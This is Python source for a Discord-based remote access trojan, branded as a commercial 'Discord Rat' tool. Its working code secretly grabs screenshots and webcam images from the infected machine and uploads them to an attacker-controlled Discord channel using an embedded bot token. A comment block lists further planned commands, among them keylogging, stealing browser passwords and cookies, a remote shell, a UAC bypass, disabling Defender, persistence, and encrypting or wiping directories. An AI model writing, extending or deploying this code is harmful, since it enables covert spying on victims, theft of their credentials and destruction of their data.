import discord
import asyncio
import subprocess
import sys
import os
from datetime import datetime, timezone
from PIL import ImageGrab
import cv2

bot_token   = "MTQ5ODAxNTQ1NDMxNTI4NjYzOA.GsR-rR.Nct0jl2DrQQiN79fHWMTQqvmii0xCwl_yuqOyE"
channel_id  = 1496558839535767733
color_embed = 0x880000
footer_text = "Buildware-Prenium | Discord Rat - https://buildwaretools.cc/"

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)


def TakeScreenshot(path):
    if sys.platform == "win32":
        img = ImageGrab.grab(all_screens=True)
        img.save(path)
    else:
        result = subprocess.run(["scrot", "--multidisp", path], capture_output=True)
        if result.returncode != 0:
            raise RuntimeError(result.stderr.decode())


def CaptureCamera(path):
    camera = cv2.VideoCapture(0)
    if not camera.isOpened():
        raise RuntimeError("No camera found or camera is unavailable.")
    ret, frame = camera.read()
    camera.release()
    if not ret:
        raise RuntimeError("Failed to capture frame from camera.")
    cv2.imwrite(path, frame)


def BuildEmbed(avatar_url, title, description=None, image=False):
    embed = discord.Embed(
        title       = title,
        description = description,
        color       = color_embed,
        timestamp   = datetime.now(timezone.utc),
    )
    embed.set_thumbnail(url=avatar_url)
    embed.set_footer(text=footer_text, icon_url=avatar_url)
    if image:
        embed.set_image(url="attachment://capture.png")
    return embed


@client.event
async def on_ready():
    pass


@client.event
async def on_message(message):
    if message.author.bot:
        return
    if message.channel.id != channel_id:
        return

    command    = message.content.strip().lower()
    avatar_url = str(client.user.display_avatar.url)

    if command == "!screenshot":
        await message.channel.typing()
        capture_path = "screenshot_tmp.png"
        try:
            loop = asyncio.get_running_loop()
            await loop.run_in_executor(None, TakeScreenshot, capture_path)
            embed = BuildEmbed(avatar_url, "Screenshot", image=True)
            file  = discord.File(capture_path, filename="capture.png")
            await message.channel.send(embed=embed, file=file)
        except Exception as e:
            embed = BuildEmbed(avatar_url, "Screenshot", description=f"```{e}```")
            await message.channel.send(embed=embed)
        finally:
            if os.path.exists(capture_path):
                os.remove(capture_path)

    elif command == "!camera":
        await message.channel.typing()
        capture_path = "camera_tmp.png"
        try:
            loop = asyncio.get_running_loop()
            await loop.run_in_executor(None, CaptureCamera, capture_path)
            embed = BuildEmbed(avatar_url, "Camera", image=True)
            file  = discord.File(capture_path, filename="capture.png")
            await message.channel.send(embed=embed, file=file)
        except Exception as e:
            embed = BuildEmbed(avatar_url, "Camera", description=f"```{e}```")
            await message.channel.send(embed=embed)
        finally:
            if os.path.exists(capture_path):
                os.remove(capture_path)


# !screenshot
# !camera
# !windows
# !mic <seconds>
# !motion
# !processes
# !kill <process_name>
# !uptime
# !volume <level>
# !brightness <level>
# !mute <on/off>
# !ls <directory>
# !download <file_path>
# !upload <file>
# !find <query>
# !read <file_path>
# !zip <directory>
# !location
# !cmd <command>
# !powershell <command>
# !open <path>
# !type <text>
# !move <x> <y>
# !clipboard
# !set_clipboard <text>
# !lock
# !shutdown
# !restart
# !url <url>
# !speak <text> <language>
# !popup <title> <message>
# !screen_record <duration>
# !tree <directory>
# !delete <file_path>
# !rename <old_path> <new_path>
# !mkdir <directory>
# !hotkey <key_combination>
# !battery
# !notify <title> <message>
# !keylog <seconds>
# !persist <on/off>
# !encrypt <file_path> <password>
# !decrypt <file_path> <password>
# !display <on/off>
# !resolution <width> <height>
# !zoom <level>
# !sleep
# !hibernate
# !logoff
# !reg_read <key_path>
# !reg_write <key_path> <value>
# !reg_delete <key_path>
# !cursor_hide <on/off>
# !schedule <command> <time>
# !browsers_passwords
# !browsers_history
# !browsers_cookies
# !saved_passwords
# !remote_shell
# !inject <process_name> <dll_path>
# !dumper <process_name>
# !uac_bypass
# !bsod
# !taskmanager <active/disable>
# !usb <active/disable>
# !hide_process
# !encrypt_dir <directory> <password>
# !decrypt_dir <directory> <password>
# !wipe <directory>
# !defender <on/off>
# !mouse_block <on/off>
# !keyboard_block <on/off>
# !fake_update
# !fake_error <message>

client.run(bot_token)